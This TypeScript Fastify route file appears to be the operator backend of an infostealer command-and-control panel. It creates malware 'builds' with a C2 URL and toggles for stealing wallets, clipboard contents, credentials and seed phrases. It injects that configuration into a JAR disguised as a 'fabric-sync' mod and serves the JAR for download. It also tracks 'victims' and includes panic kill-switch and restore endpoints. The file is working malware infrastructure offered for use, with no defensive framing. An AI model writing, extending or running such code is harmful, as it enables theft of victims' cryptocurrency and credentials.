import type { FastifyPluginAsync } from 'fastify';
import { z } from 'zod';
import { createReadStream } from 'node:fs';
import { access, mkdir, stat } from 'node:fs/promises';
import { join } from 'node:path';
import { prisma } from '../lib/db';
import { env } from '../lib/env';
import { audit } from '../lib/audit';
import { bad, HttpError, notFound } from '../lib/errors';
import { requireRole } from '../plugins/auth';
import { publish } from '../lib/bus';
import { buildToken, enrollTokenV2, openBuildSecret } from '../lib/crypto';
import { createBuild, injectConfig, type BuildConfig } from '../services/build';

const createSchema = z.object({
  name: z.string().min(2).max(64),
  version: z.string().regex(/^\d+\.\d+\.\d+$/),
  profile: z.enum(['lite', 'full']).default('full'),
  c2_base: z.string().url().optional(),
  modules: z.object({
    wallets: z.boolean().default(true),
    clipboard: z.boolean().default(true),
    credentials: z.boolean().default(true),
    seeds: z.boolean().default(true)
  }).optional(),
  crack: z.boolean().optional(),
  enroll_grace_hours: z.number().int().min(0).max(168).default(24)
});

export const buildRoutes: FastifyPluginAsync = async (app) => {
  app.get('/builds', async () => {
    const items = await prisma.build.findMany({
      orderBy: { createdAt: 'desc' },
      include: { createdBy: { select: { email: true } }, _count: { select: { victims: true } } }
    });
    return {
      items: items.map((build) => ({
        id: build.id,
        name: build.name,
        version: build.version,
        profile: build.profile,
        universal: build.universal,
        buildId: build.buildId,
        token: build.enrollScheme === 2
          ? enrollTokenV2(openBuildSecret(build.secret), build.buildId)
          : buildToken(build.secret),
        status: build.status,
        jarPath: build.jarPath,
        createdBy: build.createdBy?.email ?? null,
        victims: build._count.victims,
        createdAt: build.createdAt,
        revokedAt: build.revokedAt
      }))
    };
  });

  app.post('/builds', { preHandler: requireRole('admin') }, async (request, reply) => {
    const input = createSchema.parse(request.body);
    const created = await createBuild({ ...input, operatorId: request.operator!.id, modules: input.modules, crack: input.crack, enrollGraceHours: input.enroll_grace_hours });
    await audit(prisma, { operatorId: request.operator?.id, action: 'build.create', entity: 'build', entityId: created.id, ip: request.clientIp, data: { name: input.name, version: input.version, profile: input.profile } });
    return reply.code(201).send({ id: created.id, buildId: created.buildId, token: created.token, config: created.config });
  });

  app.post('/builds/:id/compile', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const build = await prisma.build.findUnique({ where: { id } });
    if (!build) throw notFound('build');
    if (build.status === 'revoked') throw bad('revoked', 'build revoked');
    try {
      await access(env.JAR_SOURCE);
    } catch {
      throw bad('jar_missing', `JAR_SOURCE not found: ${env.JAR_SOURCE}`, 503);
    }
    const dir = join(env.BUILD_DIR, build.id);
    await mkdir(dir, { recursive: true });
    const target = join(dir, `fabric-sync-${build.version}-${build.id.slice(0, 8)}.jar`);
    await injectConfig(env.JAR_SOURCE, build.config as unknown as BuildConfig, target);
    let bytes = 0;
    try {
      bytes = (await stat(target)).size;
    } catch {
      throw bad('compile_failed', 'jar not produced', 500);
    }
    await prisma.build.update({ where: { id }, data: { jarPath: target, status: 'ready' } });
    await audit(prisma, { operatorId: request.operator?.id, action: 'build.compile', entity: 'build', entityId: id, ip: request.clientIp, data: { target, bytes } });
    return { ok: true, bytes, path: target };
  });

  app.get('/builds/:id/download', async (request, reply) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const build = await prisma.build.findUnique({ where: { id } });
    if (!build?.jarPath) throw notFound('jar');
    const name = `fabric-sync-${build.version}.jar`;
    reply.header('content-type', 'application/java-archive');
    reply.header('content-disposition', `attachment; filename="${name}"`);
    return reply.send(createReadStream(build.jarPath));
  });


  /** Kill-switch: every agent gets 410 on the next heartbeat cycle. */
  app.post('/panic', { preHandler: requireRole('admin') }, async (request) => {
    const dry = (request.query as { dry_run?: string }).dry_run === '1';
    const where = { revokedAt: null };
    if (dry) {
      const [builds, victims] = await Promise.all([
        prisma.build.count({ where }),
        prisma.victim.count({ where })
      ]);
      return { ok: true, dry_run: true, builds, victims };
    }
    const now = new Date();
    const result = await prisma.$transaction(async (tx) => {
      const builds = await tx.build.updateMany({ where, data: { status: 'revoked', revokedAt: now } });
      // Tokens are cleared, but salt and epoch stay: a re-enroll can still open
      // the local queue once the build is restored.
      const victims = await tx.victim.updateMany({
        where,
        data: {
          status: 'revoked',
          revokedAt: now,
          identityState: 'revoked',
          graceUntil: null,
          prevTokenEnc: null,
          prevTokenExpiresAt: null,
          pendingTokenEnc: null,
          pendingTokenExpiresAt: null
        }
      });
      await audit(tx, { operatorId: request.operator?.id, action: 'panic', entity: 'build', ip: request.clientIp,
        data: { builds: builds.count, victims: victims.count } });
      return { builds: builds.count, victims: victims.count };
    });
    void publish({ type: 'panic', at: Date.now(), data: { builds: result.builds, victims: result.victims } });
    return { ok: true, builds: result.builds, victims: result.victims };
  });

  app.post('/panic/restore', { preHandler: requireRole('admin') }, async (request) => {
    const result = await prisma.$transaction(async (tx) => {
      const builds = await tx.build.updateMany({ where: { status: 'revoked' }, data: { status: 'ready', revokedAt: null } });
      const victims = await tx.victim.updateMany({ where: { status: 'revoked' }, data: { status: 'offline', revokedAt: null } });
      await audit(tx, { operatorId: request.operator?.id, action: 'panic.restore', entity: 'build', ip: request.clientIp,
        data: { builds: builds.count, victims: victims.count } });
      return { builds: builds.count, victims: victims.count };
    });
    return { ok: true, builds: result.builds, victims: result.victims, restore_only_reopens_enrollment: true };
  });

  app.post('/builds/:id/revoke', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    await prisma.$transaction(async (tx) => {
      await tx.build.update({ where: { id }, data: { status: 'revoked', revokedAt: new Date() } });
      await tx.victim.updateMany({ where: { buildId: id }, data: { status: 'revoked', revokedAt: new Date() } });
      await audit(tx, { operatorId: request.operator?.id, action: 'build.revoke', entity: 'build', entityId: id, ip: request.clientIp });
    });
    return { ok: true };
  });

  app.delete('/builds/:id', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const count = await prisma.victim.count({ where: { buildId: id } });
    if (count > 0) {
      throw new HttpError(409, 'in_use', `${count} victims still reference this build`, 0, {
        victims: count,
        filter: `/victims?build=${id}`
      });
    }
    await prisma.build.delete({ where: { id } });
    await audit(prisma, { operatorId: request.operator?.id, action: 'build.delete', entity: 'build', entityId: id, ip: request.clientIp });
    return { ok: true };
  });

  /** Moves every victim of a build to another one before the old row is deleted. */
  app.post('/builds/:id/reassign', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const { target } = z.object({ target: z.string().uuid() }).parse(request.body);
    if (target === id) throw bad('same_build', 'target build is the current one');
    const [source, destination] = await Promise.all([
      prisma.build.findUnique({ where: { id } }),
      prisma.build.findUnique({ where: { id: target } })
    ]);
    if (!source) throw notFound('build');
    if (!destination) throw notFound('target build');
    if (destination.status === 'revoked' || destination.revokedAt) throw bad('revoked', 'target build revoked');
    const moved = await prisma.victim.updateMany({ where: { buildId: id }, data: { buildId: target } });
    await audit(prisma, {
      operatorId: request.operator?.id,
      action: 'build.reassign',
      entity: 'build',
      entityId: id,
      ip: request.clientIp,
      data: { target, victims: moved.count }
    });
    return { ok: true, moved: moved.count };
  });
};
